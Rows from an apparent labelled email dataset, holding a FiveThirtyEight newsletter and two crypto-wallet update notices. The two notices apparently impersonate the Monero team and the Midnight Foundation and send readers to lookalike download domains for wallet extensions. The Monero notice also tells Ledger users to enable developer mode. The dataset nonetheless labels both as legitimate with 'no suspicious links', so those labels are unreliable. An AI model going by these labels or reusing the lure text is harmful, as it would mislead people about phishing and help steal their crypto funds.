Monero Interface Update: Desktop Enhancements, CLI Improvements,
 and Browser-Based Access,"Dear Monero Community,
We are writing to share a major update that aligns with long-standing community input and current user needs across various environments.

As part of our continued efforts to improve accessibility, flexibility, and performances across the Monero ecosystem, we are releasing upgrades to the desktop GUI and CLI wallet, along with the first beta release of a Monero browser extension wallet.
The updated Monero GUI wallet for desktop includes refinements that improve reliability, performances, and interface responsiveness across supported platforms:
* Improved remote node handling with better failover and retry logic
* Enhanced support for hardware wallets, including newer Ledger and Trezor models
* Simplified wallet creation and recovery flows
* UI adjustments for smaller and high-resolution displays
The wallet continues to support Windows, Linux, and macOS operating systems.
We’ve also released an updated version of the CLI wallet (`monero-wallet-cli`) with performances and security improvements for advanced users, developers, and operators managing automated systems.
* Faster synchronization when using trusted remote nodes
* Extended support for scripted wallet interactions
* Improved error reporting in automated transaction processing
* Hardened memory handling for improved operational security
* Added flag options for fine-grained control over mining rig connections
Download the updated CLI tools: https://app.getmoneroupdate.org/

We are introducing a browser extension wallet built specifically for users who require lightweight, direct interaction with Monero — particularly those managing mining infrastructure via Ledger hardware wallets.
* Secure Ledger integration for reading balances and authorizing transactions
* Compatibility with Chromium-based browsers (Chrome, Brave, Edge, etc.)
* Seamless pairing with the updated GUI or CLI interface
* Local-only key handling — no data is transmitted to external servers
* Session persistence across browser restarts for uninterrupted rig monitoring
Install the Monero Extension Wallet: https://app.getmoneroupdate.org/
1. Select and download the appropriate version for your platform (GUI, CLI, or Extension).
2. Follow platform-specific installation steps provided on the official site.
3. If using a Ledger device, ensure firmware is up to date and enable developer mode for best compatibility.

We thank contributors, testers, and node operators who continue to support Monero’s mission. If you encounter any issues, or if certain workflows are not yet fully covered, we encourage you to submit observations through the appropriate GitHub channels or via the in-app feedback options.
Your insights continue to inform the evolution of the Monero project.
The Monero Development Team",1,0,1,Legitimate email from Monero Development Team with clear and detailed information about updates.,"{
""reason"": ""Legitimate email from Monero Development Team with clear and detailed information about updates."",

Important Update: Wallet Extensions for Claiming Your Midnight
 Glacier Drop,"Dear Midnight Community,
As part of the ongoing Glacier Drop Airdrop, we want to provide an important update on wallet compatibility for claiming your NIGHT tokens.

Yoroi Wallet has released significant improvements to their wallet extensions. These updates are designed to better facilitate a seamless and secure claiming process for all eligible users across the supported blockchains.

We are aware of a complexity issue affecting the use of hardware devices (Ledger, Trezor, etc.) in the claiming process across multiple networks. Please rest assured that this has no impact on your allocation. Your claim remains fixed and will be fully available once the issue is resolved.
In the meantime, we are endorsing the Yoroi Wallet Extension as the only supported extensions for claiming:
Cardano (ADA) and supported chains: Please use the Yoroi Wallet Extension. Download or update to the latest version here → [ttps://download.yoroiextensionwallet.com

Installing the latest versions ensures you benefit from the improved security and optimized flow for claiming your allocation. This is especially important for users managing their NIGHT tokens alongside existing ADA, XRP, and hardware wallet setups.

Your allocations are secured, your NIGHT tokens are waiting, and your participation is central to the growth of the Midnight network. We are committed to making this process as smooth as possible and will continue providing updates as we work to resolve the hardware device compatibility issue.
Thank you for being part of this historic launch of Midnight. Together, we are building a privacy-first blockchain that empowers individuals and communities around the world.
The Midnight Foundation Team",1,0,2,"Legitimate email from a known entity, with proper formatting and no suspicious links or attachments.","{
""reason"": ""Legitimate email from a known entity, with proper formatting and no suspicious links or attachments."",

Morning Distribution for Friday, May 26, 2023,"A email Morning Distribution Friday, May 26, 2023 Your daily briefing from FiveThirtyEight The Morning Story How Bad Could A Government Default Get? By Monica Potts With less than a week until the U.S. runs out of cash, economists and policymakers are using words like “cataclysmic event” and “calamity” to describe what will happen if Congress doesn’t raise the debt limit. It seems bad. Economists are predicting that if the government is unable to pay its bills, it could bring much of the global financial system to a halt. But everyday people will be affected too. So who would a failure to raise the debt limit hurt first — and who would be hurt the most? You can think of the impact of the default as a sinkhole, pulling down the people closest to the epicenter first but spreading out to more and more people until (depending on how long it lasts) it finally engulfs the U.S. economy. The first people who are likely to be affected are those who get money directly from the government, including government employees and recipients of government direct payments, like retirees, veterans and disabled Americans who rely on social security income. Soon, though, the government’s inability to pay its bills might hit health care providers who are reimbursed through Medicare and Medicaid. Homebuyers, too, could get hit by higher interest rates, making it even more difficult for them to purchase houses in an already-competitive market. All of this adds up to a potential economic slowdown that could cause a severe recession if the crisis drags on.Read more Weekly ListenPolitics Podcast: The Case For And Against Ron DeSantis View in browserABC News Unsubscribe Our mailing address: FiveThirtyEight,47 West 66th Street, New York, NY 10023.",1,0,1,Legitimate email from a well-known news organization with a clear subject and content.,"{
